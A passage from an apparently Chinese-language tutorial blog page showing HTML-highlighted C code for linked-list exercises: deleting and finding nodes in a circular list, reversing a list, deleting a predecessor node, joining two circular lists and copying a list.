 <span class="hljs-keyword">return</span> head; <span class="hljs-comment">// 未找到节点</span><br>&#125;<br><br><span class="hljs-comment">// 按序号删除节点</span><br><span class="hljs-function">Node* <span class="hljs-title">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无效的索引\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (currentIndex == index) &#123;<br>            <span class="hljs-keyword">if</span> (p-&gt;next == p) &#123; <span class="hljs-comment">// 链表中只有一个节点</span><br>                <span class="hljs-built_in">free</span>(p);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            Node *prevNode = p-&gt;prev;<br>            Node *nextNode = p-&gt;next;<br>            prevNode-&gt;next = nextNode;<br>            nextNode-&gt;prev = prevNode;<br>            <span class="hljs-keyword">if</span> (p == head) &#123;<br>                head = nextNode; <span class="hljs-comment">// 如果删除的是头节点，更新头节点</span><br>            &#125;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;索引超出范围\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 按值查找节点</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到匹配的节点</span><br>&#125;<br><br><span class="hljs-comment">// 按序号查找节点</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (currentIndex == index) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 如果索引超出范围，将返回 NULL</span><br>&#125;<br><br><span class="hljs-comment">// 求链表长度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *head = <span class="hljs-built_in">InitList</span>(); <span class="hljs-comment">// 初始化循环链表</span><br><br>    <span class="hljs-comment">// 插入一些节点</span><br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">10</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">20</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">30</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// 打印链表内容</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 在值为30的节点之前插入值为25的节点</span><br>    head = <span class="hljs-built_in">InsertBefore</span>(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为30的节点之前插入值为25的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 在值为25的节点之后插入值为27的节点</span><br>    <span class="hljs-built_in">InsertAfter</span>(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;在值为25的节点之后插入值为27的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 删除值为20的节点</span><br>    head = <span class="hljs-built_in">Delete</span>(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除值为20的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 按序号删除节点</span><br>    head = <span class="hljs-built_in">DeleteAt</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除索引为2的节点后链表内容为：&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// 按值查找节点</span><br>    Node *foundNode = <span class="hljs-built_in">FindByValue</span>(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到值为30的节点，地址为：%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到值为30的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 按序号查找节点</span><br>    foundNode = <span class="hljs-built_in">FindByIndex</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;找到索引为1的节点，值为：%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到索引为1的节点\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 求链表长度</span><br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">GetLength</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表长度为：%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// 释放链表内存</span><br>    <span class="hljs-keyword">if</span> (head != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *p = head;<br>        <span class="hljs-keyword">do</span> &#123;<br>            Node *temp = p;<br>            p = p-&gt;next;<br>            <span class="hljs-built_in">free</span>(temp);<br>        &#125; <span class="hljs-keyword">while</span> (p != head);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义链表节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;        <br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next; <br>&#125; Node;<br><br><span class="hljs-comment">// 反转链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">reverseList</span><span class="hljs-params">(Node **head)</span> </span>&#123;<br>    Node *prev = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 初始时，前一个节点为空</span><br>    Node *curr = *head; <span class="hljs-comment">// 当前节点是链表的头节点</span><br>    Node *next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 下一个节点初始化为空</span><br><br>    <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">NULL</span>) &#123;<br>        next = curr-&gt;next;    <span class="hljs-comment">// 保存当前节点的下一个节点</span><br>        curr-&gt;next = prev;    <span class="hljs-comment">// 反转当前节点的指针</span><br>        prev = curr;          <span class="hljs-comment">// 将prev指向当前节点</span><br>        curr = next;          <span class="hljs-comment">// 当前节点移动到下一个节点</span><br>    &#125;<br>    *head = prev;  <span class="hljs-comment">// 最终，prev会指向原链表的最后一个节点，成为新的头节点</span><br>&#125;<br></code></pre></td></tr></table></figure><p>对给定的单链表L，编写一个删除中值为×的结点的直接前驱结点的算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义链表节点结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;        <span class="hljs-comment">// 存储数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next; <span class="hljs-comment">// 指向下一个节点的指针</span><br>&#125; Node;<br><br><span class="hljs-comment">// 创建新节点</span><br><span class="hljs-function">Node* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> </span>&#123;<br>    Node *newNode = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node));<br>    newNode-&gt;data = data;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br><br><span class="hljs-comment">// 删除中值为x的节点的前驱节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deletePredecessor</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-comment">// 链表为空或者只有一个节点，无法进行删除</span><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || head-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表为空或只有一个节点，无法删除前驱节点！\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *prev = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 前一个节点</span><br>    Node *curr = head; <span class="hljs-comment">// 当前节点</span><br><br>    <span class="hljs-comment">// 遍历链表，寻找值为x的节点</span><br>    <span class="hljs-keyword">while</span> (curr != <span class="hljs-literal">NULL</span> &amp;&amp; curr-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (curr-&gt;next-&gt;data == x) &#123;<br>            <span class="hljs-comment">// 找到前驱节点（curr）和后继节点（curr-&gt;next）</span><br>            <span class="hljs-comment">// 删除当前节点的前驱节点</span><br>            Node *temp = prev;<br>            <span class="hljs-keyword">if</span> (temp != <span class="hljs-literal">NULL</span>) &#123;<br>                temp-&gt;next = curr-&gt;next;  <span class="hljs-comment">// 将前驱节点的next指向curr-&gt;next，从而删除前驱节点</span><br>                <span class="hljs-built_in">free</span>(curr);  <span class="hljs-comment">// 释放前驱节点的内存</span><br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        prev = curr;<br>        curr = curr-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到值为x的节点</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到值为 %d 的节点或该节点没有前驱节点！\n&quot;</span>, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>有两个循环单链表，链表头指针分别为 headl 和 head2，<br>-个函数将链表 headl<br>链接到链表head2 之后，链接后的链表仍保持是循环链表的形式。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 数据域，存储节点的数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next;  <span class="hljs-comment">// 指针域，指向下一个节点</span><br>&#125; LinkList;<br><br><span class="hljs-comment">// 初始化带头结点的循环链表</span><br><span class="hljs-function">LinkList* <span class="hljs-title">InitCircularList</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkList *head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = head;  <span class="hljs-comment">// 初始化为空循环链表</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 头插法插入节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddHead</span><span class="hljs-params">(LinkList *head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList *newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建新节点</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = head-&gt;next; <span class="hljs-comment">// 新节点的 next 指向头结点之后的第一个节点</span><br>    head-&gt;next = newNode;       <span class="hljs-comment">// 头结点的 next 指向新节点</span><br>&#125;<br><br><span class="hljs-comment">// 尾插法插入节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddTail</span><span class="hljs-params">(LinkList *head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList *newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建新节点</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = head;       <span class="hljs-comment">// 新节点的 next 指向头结点，保持循环</span><br><br>    LinkList *p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != head) &#123;   <span class="hljs-comment">// 找到尾节点</span><br>        p = p-&gt;next;<br>    &#125;<br>    p-&gt;next = newNode;          <span class="hljs-comment">// 尾节点的 next 指向新节点</span><br>&#125;<br><br><span class="hljs-comment">// 遍历循环链表并打印</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(LinkList *head)</span> </span>&#123;<br>    LinkList *p = head-&gt;next;   <span class="hljs-comment">// 从第一个有效节点开始</span><br>    <span class="hljs-keyword">while</span> (p != head) &#123;         <span class="hljs-comment">// 遍历到头结点时停止</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回到头结点\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 合并两个带头结点的循环链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ConnectCircularLists</span><span class="hljs-params">(LinkList *head1, LinkList *head2)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head1 == <span class="hljs-literal">NULL</span> || head2 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 如果任何一个链表为空，则不需要连接</span><br>    &#125;<br><br>    LinkList *p1 = head1;<br>    LinkList *p2 = head2;<br><br>    <span class="hljs-comment">// 找到 head1 的尾节点（即 next 指向 head1 的节点）</span><br>    <span class="hljs-keyword">while</span> (p1-&gt;next != head1) &#123;<br>        p1 = p1-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// 找到 head2 的尾节点（即 next 指向 head2 的节点）</span><br>    <span class="hljs-keyword">while</span> (p2-&gt;next != head2) &#123;<br>        p2 = p2-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">// 连接两个链表并形成整体循环</span><br>    p1-&gt;next = head2-&gt;next; <span class="hljs-comment">// head1 的尾节点连接到 head2 的第一个有效节点</span><br>    p2-&gt;next = head1;       <span class="hljs-comment">// head2 的尾节点连接到 head1，确保整体循环</span><br>&#125;<br><br><span class="hljs-comment">// 主函数测试代码</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化两个循环链表</span><br>    LinkList *head1 = <span class="hljs-built_in">InitCircularList</span>();<br>    LinkList *head2 = <span class="hljs-built_in">InitCircularList</span>();<br><br>    <span class="hljs-comment">// 插入节点到 head1 链表</span><br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddTail</span>(head1, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表 head1:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head1);<br><br>    <span class="hljs-comment">// 插入节点到 head2 链表</span><br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">AddTail</span>(head2, <span class="hljs-number">6</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;链表 head2:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head2);<br><br>    <span class="hljs-comment">// 合并两个循环链表</span><br>    <span class="hljs-built_in">ConnectCircularLists</span>(head1, head2);<br><br>    <span class="hljs-comment">// 打印合并后的链表</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;合并后的循环链表:\n&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head1);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>复制链表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// 数据域，存储节点的数据</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>* next;  <span class="hljs-comment">// 指针域，指向下一个节点</span><br>&#125; LinkList;<br><br><span class="hljs-comment">// 初始化带头结点的单向链表</span><br><span class="hljs-function">LinkList* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    LinkList* head = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建头结点</span><br>    head-&gt;next = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 头结点的 next 初始化为空</span><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// 尾插法插入节点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddTail</span><span class="hljs-params">(LinkList* head, <span class="hljs-type">int</span> data)</span> </span>&#123;<br>    LinkList* newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建新节点</span><br>    newNode-&gt;data = data;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    LinkList* p = head;<br>    <span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 找到链表的尾节点</span><br>        p = p-&gt;next;<br>    &#125;<br>    p-&gt;next = newNode; <span class="hljs-comment">// 尾节点的 next 指向新节点</span><br>&#125;<br><br><span class="hljs-comment">// 复制带头结点的单向链表</span><br><span class="hljs-function">LinkList* <span class="hljs-title">CopyList</span><span class="hljs-params">(LinkList* head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    LinkList* newHead = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建新链表的头结点</span><br>    newHead-&gt;next = <span class="hljs-literal">NULL</span>;<br>    LinkList* p = head-&gt;next;  <span class="hljs-comment">// 指向原链表第一个有效节点</span><br>    LinkList* q = newHead;     <span class="hljs-comment">// 指向新链表的尾部，用于追加新节点</span><br><br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        LinkList* newNode = (LinkList*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(LinkList)); <span class="hljs-comment">// 创建新节点</span><br>        newNode-&gt;data = p-&gt;data;<br>        newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        q-&gt;next = newNode; <span class="hljs-comment">// 将新节点添加到新链表</span><br>        q = newNode;       <span class="hljs-comment">// 更新 q 为新节点</span><br><br>        p = p-&gt;next;       <span class="hljs-comment">// 移动到原链表的下一个节点</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> newHead;<br>&#125;<br><br><span class="hljs-comment">// 打印链表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(LinkList* head)</span> </span>&#123;<br>    LinkList* p = head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 创建原始链表并添加节点</span><br>    LinkList* head = <span class="hljs-built_in">InitList</span>();<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddTail</span>(head, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span 